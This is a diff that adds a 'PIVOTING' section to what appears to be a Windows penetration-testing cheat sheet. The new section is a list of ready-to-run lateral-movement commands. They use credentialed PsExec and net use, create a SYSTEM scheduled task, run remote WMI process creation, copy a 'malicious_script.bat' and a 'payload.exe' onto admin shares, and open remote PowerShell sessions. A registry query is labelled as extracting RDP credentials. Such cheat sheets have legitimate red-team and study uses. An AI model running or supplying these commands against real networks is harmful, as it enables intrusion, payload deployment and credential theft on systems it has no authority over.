@@ -41,3 +41,34 @@ dir C:\*.* /A:H /S
 tasklist /svc
 wmic process list brief
 
+
+#####################
+PIVOTING
+####################
+#PsExec
+net use \\target_machine_ip /user:<DOMAIN>\<USERNAME> <PASSWORD>
+psexec \\target_machine_ip cmd.exe
+
+#Scheduled tasks
+schtasks /create /s target_machine_ip /tn "PivotTask" /tr "cmd.exe /c <command>" /sc ONCE /st 12:00 /ru SYSTEM
+schtasks /run /s target_machine_ip /tn "PivotTask"
+
+#Remote WMI exec
+wmic /node:"target_machine_ip" /user:"domain\username" process call create "cmd.exe /c whoami"
+
+#Remote shares
+net use \\target_machine_ip\share_name /USER:<USERNAME> <PASSWORD>
+copy C:\path\to\malicious_script.bat \\target_machine_ip\share_name
+schtasks, PsExec, or WMI (from above)
+
+#default admin shares
+net use \\target_machine_ip\C$ /user:<USERNAME> <PASSWORD>
+copy C:\payload.exe \\target_machine_ip\C$\Windows\Temp
+
+#remote powershell
+Enter-PSSession -ComputerName target_machine_ip -Credential (Get-Credential)
+Invoke-Command -ComputerName target_machine_ip -ScriptBlock { Get-Process }
+
+#extracting ssh/rdp creds
+reg query HKLM\SOFTWARE\Microsoft\Terminal Server Client\Default\Servers
+
